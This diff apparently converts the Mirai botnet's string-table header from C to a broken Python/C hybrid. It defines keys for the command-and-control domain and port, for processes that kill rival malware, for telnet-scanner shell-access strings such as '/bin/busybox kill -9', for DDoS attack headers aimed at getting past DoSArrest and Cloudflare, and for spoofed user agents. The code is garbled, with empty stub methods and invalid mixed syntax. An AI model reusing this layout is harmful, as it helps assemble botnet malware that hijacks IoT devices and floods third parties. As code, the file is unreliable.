@@ -3,24 +3,86 @@
 #include <stdint.h>
 #include "includes.h"
 
-struct table_value {
-#ifdef DEBUG
-    BOOL locked
-#endif
+class table_value(object):
+    def __init__(self,TABLE_PROCESS_ARGV,TABLE_EXEC_SUCCESS,TABLE_CNC_DOMAIN,TABLE_CNC_PORT,TABLE_KILLER_SAFE,TABLE_KILLER_PROC,TABLE_KILLER_EXE,TABLE_KILLER_DELETED,TABLE_KILLER_FD,TABLE_KILLER_ANIME,TABLE_KILLER_STATUS,TABLE_MEM_QBOT,TABLE_MEM_QBOT2,TABLE_MEM_QBOT3,TABLE_MEM_UPX,TABLE_MEM_ZOLLARD,TABLE_MEM_REMAITEN,TABLE_SCAN_CB_DOMAIN,TABLE_SCAN_CB_PORT,TABLE_SCAN_SHELL,TABLE_SCAN_ENABLE,TABLE_SCAN_SYSTEM,TABLE_SCAN_SH,TABLE_SCAN_QUERY,TABLE_SCAN_RESP,TABLE_SCAN_NCORRECT,TABLE_SCAN_PS,TABLE_SCAN_KILL_9,TABLE_ATK_VSE,TABLE_ATK_RESOLVER,TABLE_ATK_NSERV,TABLE_ATK_KEEP_ALIVE,TABLE_ATK_ACCEPT,TABLE_ATK_ACCEPT_LNG,TABLE_ATK_CONTENT_TYPE,TABLE_ATK_SET_COOKIE,TABLE_ATK_REFRESH_HDR,TABLE_ATK_LOCATION_HDR,TABLE_ATK_SET_COOKIE_HDR,TABLE_ATK_CONTENT_LENGTH_HDR,TABLE_ATK_TRANSFER_ENCODING_HDR,TABLE_ATK_CHUNKED,TABLE_ATK_KEEP_ALIVE_HDR,TABLE_ATK_CONNECTION_HDR,TABLE_ATK_DOSARREST,TABLE_ATK_CLOUDFLARE_NGINX,TABLE_HTTP_ONE,TABLE_HTTP_TWO,TABLE_HTTP_THREE,TABLE_HTTP_FOUR,TABLE_HTTP_FIVE,TABLE_MAX_KEYS):
+        self.TABLE_PROCESS_ARGV = TABLE_PROCESS_ARGV
+        self.TABLE_EXEC_SUCCESS = TABLE_EXEC_SUCCESS
+        self.TABLE_CNC_DOMAIN = TABLE_CNC_DOMAIN
+        self.TABLE_CNC_PORT = TABLE_CNC_PORT
+        self.TABLE_KILLER_SAFE = TABLE_KILLER_SAFE
+        self.TABLE_KILLER_PROC = TABLE_KILLER_PROC
+        self.TABLE_KILLER_EXE = TABLE_KILLER_EXE
+        self.TABLE_KILLER_DELETED = TABLE_KILLER_DELETED
+        self.TABLE_KILLER_FD = TABLE_KILLER_FD
+        self.TABLE_KILLER_ANIME = TABLE_KILLER_ANIME
+        self.TABLE_KILLER_STATUS = TABLE_KILLER_STATUS
+        self.TABLE_MEM_QBOT = TABLE_MEM_QBOT
+        self.TABLE_MEM_QBOT2 = TABLE_MEM_QBOT2
+        self.TABLE_MEM_QBOT3 = TABLE_MEM_QBOT3
+        self.TABLE_MEM_UPX = TABLE_MEM_UPX
+        self.TABLE_MEM_ZOLLARD = TABLE_MEM_ZOLLARD
+        self.TABLE_MEM_REMAITEN = TABLE_MEM_REMAITEN
+        self.TABLE_SCAN_CB_DOMAIN = TABLE_SCAN_CB_DOMAIN
+        self.TABLE_SCAN_CB_PORT = TABLE_SCAN_CB_PORT
+        self.TABLE_SCAN_SHELL = TABLE_SCAN_SHELL
+        self.TABLE_SCAN_ENABLE = TABLE_SCAN_ENABLE
+        self.TABLE_SCAN_SYSTEM = TABLE_SCAN_SYSTEM
+        self.TABLE_SCAN_SH = TABLE_SCAN_SH
+        self.TABLE_SCAN_QUERY = TABLE_SCAN_QUERY
+        self.TABLE_SCAN_RESP = TABLE_SCAN_RESP
+        self.TABLE_SCAN_NCORRECT = TABLE_SCAN_NCORRECT
+        self.TABLE_SCAN_PS = TABLE_SCAN_PS
+        self.TABLE_SCAN_KILL_9 = TABLE_SCAN_KILL_9
+        self.TABLE_ATK_VSE = TABLE_ATK_VSE
+        self.TABLE_ATK_RESOLVER = TABLE_ATK_RESOLVER
+        self.TABLE_ATK_NSERV = TABLE_ATK_NSERV
+        self.TABLE_ATK_KEEP_ALIVE = TABLE_ATK_KEEP_ALIVE
+        self.TABLE_ATK_ACCEPT = TABLE_ATK_ACCEPT
+        self.TABLE_ATK_ACCEPT_LNG = TABLE_ATK_ACCEPT_LNG
+        self.TABLE_ATK_CONTENT_TYPE = TABLE_ATK_CONTENT_TYPE
+        self.TABLE_ATK_SET_COOKIE = TABLE_ATK_SET_COOKIE
+        self.TABLE_ATK_REFRESH_HDR = TABLE_ATK_REFRESH_HDR
+        self.TABLE_ATK_LOCATION_HDR = TABLE_ATK_LOCATION_HDR
+        self.TABLE_ATK_SET_COOKIE_HDR = TABLE_ATK_SET_COOKIE_HDR
+        self.TABLE_ATK_CONTENT_LENGTH_HDR = TABLE_ATK_CONTENT_LENGTH_HDR
+        self.TABLE_ATK_TRANSFER_ENCODING_HDR = TABLE_ATK_TRANSFER_ENCODING_HDR
+        self.TABLE_ATK_CHUNKED = TABLE_ATK_CHUNKED
+        self.TABLE_ATK_KEEP_ALIVE_HDR = TABLE_ATK_KEEP_ALIVE_HDR
+        self.TABLE_ATK_CONNECTION_HDR = TABLE_ATK_CONNECTION_HDR
+        self.TABLE_ATK_DOSARREST = TABLE_ATK_DOSARREST
+        self.TABLE_ATK_CLOUDFLARE_NGINX = TABLE_ATK_CLOUDFLARE_NGINX
+        self.TABLE_HTTP_ONE = TABLE_HTTP_ONE
+        self.TABLE_HTTP_TWO = TABLE_HTTP_TWO
+        self.TABLE_HTTP_THREE = TABLE_HTTP_THREE
+        self.TABLE_HTTP_FOUR = TABLE_HTTP_FOUR
+        self.TABLE_HTTP_FIVE = TABLE_HTTP_FIVE
+        self.TABLE_MAX_KEYS = TABLE_MAX_KEYS
+    def add_entry(int):
+        return
+    def toggle_obf(int):
+        return
 
-# Generic bot info 
+locked = True
+static add_entry(uint8_t, , int)
+static toggle_obf(uint8_t)
+# struct table_value {
+# #ifdef DEBUG
+#     BOOL locked
+# #endif
+
+# Generic bot info
 TABLE_PROCESS_ARGV	= 1
 TABLE_EXEC_SUCCESS	= 2
 TABLE_CNC_DOMAIN	= 3
 TABLE_CNC_PORT	= 4
-          
-# Killer data           
+
+# Killer data
 TABLE_KILLER_SAFE	= 5
 TABLE_KILLER_PROC	= 6
 TABLE_KILLER_EXE	= 7
-TABLE_KILLER_DELETED	= 8   # " (deleted)" 
-TABLE_KILLER_FD	= 9   # "/fd" 
-TABLE_KILLER_ANIME	= 10  # .anime 
+TABLE_KILLER_DELETED	= 8   # " (deleted)"
+TABLE_KILLER_FD	= 9   # "/fd"
+TABLE_KILLER_ANIME	= 10  # .anime
 TABLE_KILLER_STATUS	= 11
 TABLE_MEM_QBOT	= 12
 TABLE_MEM_QBOT2	= 13
@@ -28,26 +90,26 @@ TABLE_MEM_QBOT3	= 14
 TABLE_MEM_UPX	= 15
 TABLE_MEM_ZOLLARD	= 16
 TABLE_MEM_REMAITEN	= 17
-          
-# Scanner data           
-TABLE_SCAN_CB_DOMAIN	= 18  # domain to connect to 
-TABLE_SCAN_CB_PORT	= 19  # Port to connect to 
-TABLE_SCAN_SHELL	= 20  # 'shell' to enable shell access 
-TABLE_SCAN_ENABLE	= 21  # 'enable' to enable shell access 
-TABLE_SCAN_SYSTEM	= 22  # 'system' to enable shell access 
-TABLE_SCAN_SH	= 23  # 'sh' to enable shell access 
-TABLE_SCAN_QUERY	= 24  # echo hex string to verify login 
-TABLE_SCAN_RESP	= 25  # utf8 version of query string 
-TABLE_SCAN_NCORRECT	= 26  # 'ncorrect' to fast-check for invalid password 
-TABLE_SCAN_PS	= 27  # "/bin/busybox ps" 
-TABLE_SCAN_KILL_9	= 28  # "/bin/busybox kill -9 " 
-          
-# Attack strings           
-TABLE_ATK_VSE	= 29  # TSource Engine Query 
-TABLE_ATK_RESOLVER	= 30  # /etc/resolv.conf 
-TABLE_ATK_NSERV	= 31  # "nameserver " 
 
-TABLE_ATK_KEEP_ALIVE	= 32  # "Connection: keep-alive" 
+# Scanner data
+TABLE_SCAN_CB_DOMAIN	= 18  # domain to connect to
+TABLE_SCAN_CB_PORT	= 19  # Port to connect to
+TABLE_SCAN_SHELL	= 20  # 'shell' to enable shell access
+TABLE_SCAN_ENABLE	= 21  # 'enable' to enable shell access
+TABLE_SCAN_SYSTEM	= 22  # 'system' to enable shell access
+TABLE_SCAN_SH	= 23  # 'sh' to enable shell access
+TABLE_SCAN_QUERY	= 24  # echo hex string to verify login
+TABLE_SCAN_RESP	= 25  # utf8 version of query string
+TABLE_SCAN_NCORRECT	= 26  # 'ncorrect' to fast-check for invalid password
+TABLE_SCAN_PS	= 27  # "/bin/busybox ps"
+TABLE_SCAN_KILL_9	= 28  # "/bin/busybox kill -9 "
+
+# Attack strings
+TABLE_ATK_VSE	= 29  # TSource Engine Query
+TABLE_ATK_RESOLVER	= 30  # /etc/resolv.conf
+TABLE_ATK_NSERV	= 31  # "nameserver "
+
+TABLE_ATK_KEEP_ALIVE	= 32  # "Connection: keep-alive"
 TABLE_ATK_ACCEPT	= 33  # "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" // */
 TABLE_ATK_ACCEPT_LNG	= 34  # "Accept-Language: en-US,en;q=0.8"
 TABLE_ATK_CONTENT_TYPE	= 35  # "Content-Type: application/x-www-form-urlencoded"
@@ -63,15 +125,15 @@ TABLE_ATK_CONNECTION_HDR	= 44  # "connection:"
 TABLE_ATK_DOSARREST	= 45  # "server: dosarrest"
 TABLE_ATK_CLOUDFLARE_NGINX	= 46  # "server: cloudflare-nginx"
 
-# User agent strings 
-TABLE_HTTP_ONE	= 47  # "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
-TABLE_HTTP_TWO	= 48  # "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" 
-TABLE_HTTP_THREE	= 49  # "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
-TABLE_HTTP_FOUR	= 50  # "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" 
-TABLE_HTTP_FIVE	= 51  # "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" 
+# User agent strings
+TABLE_HTTP_ONE	= 47  # "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+TABLE_HTTP_TWO	= 48  # "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+TABLE_HTTP_THREE	= 49  # "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+TABLE_HTTP_FOUR	= 50  # "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+TABLE_HTTP_FIVE	= 51  # "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
 
-TABLE_MAX_KEYS	= 52 # Highest value + 1 
- 
+TABLE_MAX_KEYS	= 52 # Highest value + 1
 
-static add_entry(uint8_t, , int)
-static toggle_obf(uint8_t)
+
+# static add_entry(uint8_t, , int)
+# static toggle_obf(uint8_t)
